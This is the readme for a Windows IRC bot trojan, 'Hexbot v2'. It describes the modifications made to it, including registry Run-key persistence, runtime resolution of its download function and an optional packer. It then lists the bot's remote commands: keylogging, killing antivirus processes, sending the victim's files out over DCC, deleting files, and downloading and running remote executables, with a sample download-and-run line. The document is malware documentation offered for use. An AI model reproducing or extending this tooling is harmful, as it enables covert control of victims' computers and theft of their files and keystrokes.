Name: Hexbot v2
Author: "Nibble" original, patched and added on by Bull Moose.
Type: Trojan (IRC Bot)
Date: 12/7/09

Modified by Bull Moose to compile correctly on MinGW, added a block of code to copy to registry in 
the "run" key, fixed URLDownloadToFile to get its address using LoadLibrary and GetProcAddress 
to save file size and to compensate for MinGW not having the urlmon library, added a makefile to automate 
compilation, added config.h for easy configuration, added an optional protector (specify -p as the 1st argument for makefile), 
added some options in config.h.

COMMANDS:

.login     - u must be login to send      |
commands to bot                           |
.op        - Give op to someone           |.op #chan nick                     
.deop      - Deop someone        	  |.deop #chan nick                  
.v         - Give voice      		  |.v    #chan nick                   
.-v        - ..               		  |					 
.kick      - kick someone     		  |.kick #chan nick reason(Example    
.ban       - ban someone      		  |.ban #chan  nick
.unban     -  unban someone    		  |.unban #chan nick
.join      - bot joins to chan            |.join #chan  
.part      - bot leave chan     	  |.part #chan
.logout    - u r logged out and u         |
cant send commands anymore                |
.hop       - bot leave and join #chan     |.hop #chan pass - if the pass is set to chan
.reconnect - bot reconnects               |
.rndnick   - bot change nick randomly     |
.die       - exit program	          |
.raw       - bot send command to server   |.raw PRIVMSG #b0t :Whatzzz up?
.status    - How long bot is connected to |
server					  |
.dns       - get ip from hostname         |.dns www.google.com
.listf     - listf files from some dir    |.listf C:\windows\*.*
.get       - bot send u a file through DCC|.get C:\log.txt
.killp     - kill process                 |.killp AV.EXE
.listp     - list processes               |
.listd     - list drives	          |
.run       -  run file param show(true/F) |.run C:\windows\notepad.exe c:\log.txt true
.makedir   - make directory               |.makedir C:\test
.removedir - remove directory             |.removedir C:\test      
.del       - delete file                  |.del C:\log.txt
.ren       - rename file                  |.ren C:\windows\notepad.exe C:\windows\shit.exe
.threads   - list threads		  |
.killthr   - kill thread                  |.killthr 0
.keyspy    - ..			          |
.keystop				  |
.delay     - run some commands for x times|.delay 10 .msg #b0t Test | .delay 10 .hop #b0t 
.download  - download path run(true/false)|.download www.mysite.com/file.exe C:\file.exe true
.msg       - bot send message             |.msg #b0t HEYA!
.notice    - ...same like msg	          |